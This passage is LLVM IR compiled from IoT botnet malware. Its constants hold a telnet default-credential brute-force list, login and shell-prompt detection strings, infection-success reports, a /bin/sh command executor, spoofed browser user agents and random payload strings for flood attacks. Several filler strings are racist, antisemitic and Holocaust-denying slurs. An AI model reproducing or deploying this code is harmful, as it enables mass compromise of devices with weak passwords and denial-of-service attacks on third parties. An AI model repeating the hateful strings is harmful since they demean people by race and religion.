0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)], align 16
@mainCommSock = dso_local global i32 0, align 4
@actualparent = dso_local global i32 0, align 4
@.str.189 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.190 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.191 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.192 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.193 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.194 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.195 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.196 = private unnamed_addr constant [5 x i8] c"adm\00\00", align 1
@.str.197 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.199 = private unnamed_addr constant [8 x i8] c"mg3500\00\00", align 1
@.str.200 = private unnamed_addr constant [8 x i8] c"admin1\00\00", align 1
@.str.201 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.202 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.203 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.204 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.205 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.206 = private unnamed_addr constant [8 x i8] c"000000\00\00", align 1
@.str.207 = private unnamed_addr constant [7 x i8] c"14567\00\00", align 1
@.str.208 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.209 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.210 = private unnamed_addr constant [9 x i8] c"admin14\00\00", align 1
@.str.211 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.212 = private unnamed_addr constant [10 x i8] c"00000000\00\00", align 1
@.str.213 = private unnamed_addr constant [4 x i8] c"<>\00\00", align 1
@.str.214 = private unnamed_addr constant [6 x i8] c"klv1\00\00", align 1
@.str.215 = private unnamed_addr constant [7 x i8] c"klv14\00\00", align 1
@.str.216 = private unnamed_addr constant [10 x i8] c"oelinux1\00\00", align 1
@.str.217 = private unnamed_addr constant [9 x i8] c"realtek\00\00", align 1
@.str.218 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.219 = private unnamed_addr constant [7 x i8] c"54321\00\00", align 1
@.str.220 = private unnamed_addr constant [8 x i8] c"antslq\00\00", align 1
@.str.221 = private unnamed_addr constant [9 x i8] c"zte9x15\00\00", align 1
@.str.222 = private unnamed_addr constant [8 x i8] c"system\00\00", align 1
@.str.223 = private unnamed_addr constant [6 x i8] c"1456\00\00", align 1
@.str.224 = private unnamed_addr constant [8 x i8] c"888888\00\00", align 1
@.str.225 = private unnamed_addr constant [6 x i8] c"ikwb\00\00", align 1
@.str.226 = private unnamed_addr constant [10 x i8] c"juantech\00\00", align 1
@.str.227 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.228 = private unnamed_addr constant [9 x i8] c"1111111\00\00", align 1
@.str.229 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.230 = private unnamed_addr constant [5 x i8] c"145\00\00", align 1
@.str.231 = private unnamed_addr constant [6 x i8] c"4321\00\00", align 1
@.str.232 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.233 = private unnamed_addr constant [6 x i8] c"abc1\00\00", align 1
@.str.234 = private unnamed_addr constant [8 x i8] c"switch\00\00", align 1
@.str.235 = private unnamed_addr constant [8 x i8] c"meinsm\00\00", align 1
@.str.236 = private unnamed_addr constant [10 x i8] c"smcadmin\00\00", align 1
@.str.237 = private unnamed_addr constant [10 x i8] c"14567890\00\00", align 1
@.str.238 = private unnamed_addr constant [4 x i8] c"14\00\00", align 1
@.str.239 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.240 = private unnamed_addr constant [8 x i8] c"merlin\00\00", align 1
@.str.241 = private unnamed_addr constant [7 x i8] c"zlxx.\00\00", align 1
@.str.242 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.243 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.244 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.245 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.246 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.248 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.249 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.250 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.251 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.252 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.253 = private unnamed_addr constant [8 x i8] c"goodbye\00", align 1
@.str.254 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.255 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.256 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.257 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.258 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.259 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.260 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.261 = private unnamed_addr constant [7 x i8] c"usybox\00", align 1
@.str.262 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.263 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.264 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.265 = private unnamed_addr constant [5 x i8] c"AK47\00", align 1
@legit = dso_local global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
@.str.266 = private unnamed_addr constant [8 x i8] c"LULZbOT\00", align 1
@infected = dso_local global [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.266, i32 0, i32 0), i8* null], align 16
@.str.267 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.268 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.269 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.270 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.271 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.272 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.273 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.274 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.275 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.276 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.277 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.278 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.279 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.280 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.281 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.282 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.283 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.284 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.285 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.286 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.287 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.288 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.289 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.290 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.291 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.292 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.293 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.294 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.295 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.296 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.297 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.298 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.299 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.300 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.301 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.302 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.303 = private unnamed_addr constant [2 x i8] c" \00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.304 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.305 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.306 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.307 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.308 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.309 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.310 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.311 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.312 = private unnamed_addr constant [3 x i8] c"80\00", align 1
@.str.313 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.314 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.315 = private unnamed_addr constant [19 x i8] c"REPORT %s:23 %s:%s\00", align 1
@.str.316 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"system\0D\0A\00", align 1
@.str.318 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.319 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.320 = private unnamed_addr constant [27 x i8] c"echo -e '\\x41\\x4b\\x34\\x37'\00", align 1
@.str.321 = private unnamed_addr constant [35 x i8] c"SUCCESSFUL INFECTION ---> %s:%s:%s\00", align 1
@.str.322 = private unnamed_addr constant [31 x i8] c"FAILED TO INFECT ---> %s:%s:%s\00", align 1
@.str.323 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.324 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.325 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.326 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.327 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.328 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.329 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.330 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.331 = private unnamed_addr constant [10 x i8] c"tfw no gf\00", align 1
@.str.332 = private unnamed_addr constant [11 x i8] c"frienzoned\00", align 1
@.str.333 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.334 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"keksec\00", align 1
@.str.337 = private unnamed_addr constant [11 x i8] c"keksec rox\00", align 1
@.str.338 = private unnamed_addr constant [11 x i8] c"keksec ROX\00", align 1
@.str.339 = private unnamed_addr constant [10 x i8] c"get raped\00", align 1
@.str.340 = private unnamed_addr constant [18 x i8] c"not a ddos packet\00", align 1
@.str.341 = private unnamed_addr constant [23 x i8] c"also not a ddos packet\00", align 1
@.str.342 = private unnamed_addr constant [28 x i8] c"seriously not a ddos packet\00", align 1
@.str.343 = private unnamed_addr constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00", align 1
@.str.344 = private unnamed_addr constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00", align 1
@.str.345 = private unnamed_addr constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00", align 1
@.str.346 = private unnamed_addr constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00", align 1
@.str.347 = private unnamed_addr constant [16 x i8] c"8======D~~~~~~~\00", align 1
@.str.348 = private unnamed_addr constant [8 x i8] c"suck it\00", align 1
@.str.349 = private unnamed_addr constant [10 x i8] c"give succ\00", align 1
@.str.350 = private unnamed_addr constant [47 x i8] c"big nigger dick 8============================D\00", align 1
@.str.351 = private unnamed_addr constant [18 x i8] c"( . Y . ) tiddies\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"bigkek\00", align 1
@.str.353 = private unnamed_addr constant [13 x i8] c"eye pee rape\00", align 1
@.str.354 = private unnamed_addr constant [21 x i8] c"eye pee address rape\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"IP rape\00", align 1
@.str.356 = private unnamed_addr constant [13 x i8] c"This is LOIC\00", align 1
@.str.357 = private unnamed_addr constant [5 x i8] c"LOIC\00", align 1
@.str.358 = private unnamed_addr constant [5 x i8] c"HOIC\00", align 1
@.str.359 = private unnamed_addr constant [5 x i8] c"XOIC\00", align 1
@.str.360 = private unnamed_addr constant [7 x i8] c"LHXOIC\00", align 1
@.str.361 = private unnamed_addr constant [33 x i8] c"A cat is fine too. Desudesudesu~\00", align 1
@.str.362 = private unnamed_addr constant [18 x i8] c"the biiiiig pussy\00", align 1
@.str.363 = private unnamed_addr constant [6 x i8] c"benis\00", align 1
@.str.364 = private unnamed_addr constant [6 x i8] c"penis\00", align 1
@.str.365 = private unnamed_addr constant [5 x i8] c"dick\00", align 1
@.str.366 = private unnamed_addr constant [7 x i8] c"vagina\00", align 1
@.str.367 = private unnamed_addr constant [9 x i8] c"clitoris\00", align 1
@.str.368 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.369 = private unnamed_addr constant [4 x i8] c"tfw\00", align 1
@.str.370 = private unnamed_addr constant [4 x i8] c":^}\00", align 1
@.str.371 = private unnamed_addr constant [9 x i8] c"dic pic?\00", align 1
@.str.372 = private unnamed_addr constant [11 x i8] c"send nudes\00", align 1
@.str.373 = private unnamed_addr constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00", align 1
@.str.374 = private unnamed_addr constant [24 x i8] c"Never gonna give you up\00", align 1
@.str.375 = private unnamed_addr constant [25 x i8] c"Never gonna make you cry\00", align 1
@.str.376 = private unnamed_addr constant [24 x i8] c"Never gonna let you die\00", align 1
@.str.377 = private unnamed_addr constant [21 x i8] c"Never gonna hurt you\00", align 1
@.str.378 = private unnamed_addr constant [14 x i8] c"bush did 9/11\00", align 1
@.str.379 = private unnamed_addr constant [32 x i8] c"jet fuel can't melt steel beams\00", align 1
@.str.380 = private unnamed_addr constant [23 x i8] c"9/11 was an inside job\00", align 1
@.str.381 = private unnamed_addr constant [23 x i8] c"the illuminati is real\00", align 1
@.str.382 = private unnamed_addr constant [14 x i8] c"wake up sheep\00", align 1
@.str.383 = private unnamed_addr constant [22 x i8] c"i flex like david ike\00", align 1
@.str.384 = private unnamed_addr constant [35 x i8] c"6 million jews? show me the proof!\00", align 1
@.str.385 = private unnamed_addr constant [18 x i8] c"T R I G G E R E D\00", align 1
@.str.386 = private unnamed_addr constant [22 x i8] c"free masons suck cock\00", align 1
@.str.387 = private unnamed_addr constant [10 x i8] c"ihatejews\00", align 1
@.str.388 = private unnamed_addr constant [6 x i8] c"urgay\00", align 1
@.str.389 = private unnamed_addr constant [16 x i8] c"tfw u like dick\00", align 1
@.str.390 = private unnamed_addr constant [9 x i8] c"dickbutt\00", align 1
@.str.391 = private unnamed_addr constant [20 x i8] c"The elusive dickbut\00", align 1
@.str.392 = private unnamed_addr constant [27 x i8] c"Heyyy that's pretty gooood\00", align 1
@.str.393 = private unnamed_addr constant [15 x i8] c"NSA sucks cock\00", align 1
@.str.394 = private unnamed_addr constant [15 x i8] c"FBI sucks cock\00", align 1
@.str.395 = private unnamed_addr constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00", align 1
@.str.396 = private unnamed_addr constant [28 x i8] c"Oh yeah I like nulling shit\00", align 1
@.str.397 = private unnamed_addr constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00", align 1
@.str.398 = private unnamed_addr constant [28 x i8] c"Keemstar is a fucking knome\00", align 1
@.str.399 = private unnamed_addr constant [17 x i8] c"Leafy is gawd <3\00", align 1
@.str.400 = private unnamed_addr constant [25 x i8] c"Ourmine is full of skids\00", align 1
@.str.401 = private unnamed_addr constant [20 x i8] c"STC is the greatest\00", align 1
@__const.sendSTD.randstrings = private unnamed_addr constant [78 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x 